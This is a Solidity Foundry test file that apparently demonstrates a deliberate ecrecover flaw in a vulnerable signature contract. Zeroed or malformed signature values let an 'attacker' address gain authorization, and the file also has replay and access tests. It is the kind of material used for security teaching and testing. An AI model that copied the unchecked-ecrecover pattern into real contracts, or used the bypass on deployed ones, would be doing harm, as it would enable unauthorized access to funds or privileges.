// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SignatureAttacks.sol";

contract SignatureAttacksTest is Test {
    VulnerableSignatureContract public vulnerableContract;
    
    // Test accounts
    address public alice = address(0x1);
    address public bob = address(0x2);
    address public attacker = address(0x3);
    
    function setUp() public {
        vulnerableContract = new VulnerableSignatureContract();
    }
    
    function testValidSignature() public {
        // Create a valid signature
        bytes32 hash = vulnerableContract.createAuthorizationHash(bob, 1);
        
        // Sign the hash with Alice's private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash); // private key 1 corresponds to alice
        
        // Authorize Bob using Alice's signature
        vulnerableContract.authorizeUser(v, r, s, hash, bob);
        
        // Verify Bob is now authorized
        assertTrue(vulnerableContract.isAuthorized(bob));
    }
    
    function testVulnerabilityWithInvalidSignature() public {
        // Create a hash
        bytes32 hash = vulnerableContract.createAuthorizationHash(attacker, 1);
        
        // Use invalid signature components that will cause ecrecover to return address(0)
        uint8 v = 0;
        bytes32 r = bytes32(0);
        bytes32 s = bytes32(0);
        
        // This should fail but doesn't due to the vulnerability
        // The contract doesn't validate that ecrecover returns a valid address
        vulnerableContract.authorizeUser(v, r, s, hash, attacker);
        
        // The attacker is now authorized despite providing an invalid signature!
        assertTrue(vulnerableContract.isAuthorized(attacker));
    }
    
    function testVulnerabilityWithMalformedSignature() public {
        // Create a hash
        bytes32 hash = vulnerableContract.createAuthorizationHash(attacker, 2);
        
        // Use malformed signature components
        uint8 v = 255; // Invalid v value
        bytes32 r = bytes32(uint256(1));
        bytes32 s = bytes32(uint256(1));
        
        // This should also fail but doesn't due to the vulnerability
        vulnerableContract.authorizeUser(v, r, s, hash, attacker);
        
        // The attacker is authorized with malformed signature
        assertTrue(vulnerableContract.isAuthorized(attacker));
    }
    
    function testRecoverSignerWithInvalidSignature() public {
        // Test the recoverSigner function with invalid signature
        uint8 v = 0;
        bytes32 r = bytes32(0);
        bytes32 s = bytes32(0);
        bytes32 hash = keccak256("test");
        
        address recovered = vulnerableContract.recoverSigner(v, r, s, hash);
        
        // ecrecover returns address(0) for invalid signatures
        assertEq(recovered, address(0));
    }
    
    function testReplayAttack() public {
        // Create a valid signature
        bytes32 hash = vulnerableContract.createAuthorizationHash(bob, 1);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
        
        // First authorization should succeed
        vulnerableContract.authorizeUser(v, r, s, hash, bob);
        
        // Try to use the same signature again (should fail due to hash reuse protection)
        vm.expectRevert("Hash already used");
        vulnerableContract.authorizeUser(v, r, s, hash, bob);
    }
    
    function testProcessDataRequiresAuthorization() public {
        // Try to process data without authorization
        vm.expectRevert("Not authorized");
        vulnerableContract.processData("test data");
        
        // Authorize the caller
        bytes32 hash = vulnerableContract.createAuthorizationHash(address(this), 1);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
        vulnerableContract.authorizeUser(v, r, s, hash, address(this));
        
        // Now should be able to process data
        assertTrue(vulnerableContract.processData("test data"));
    }
} 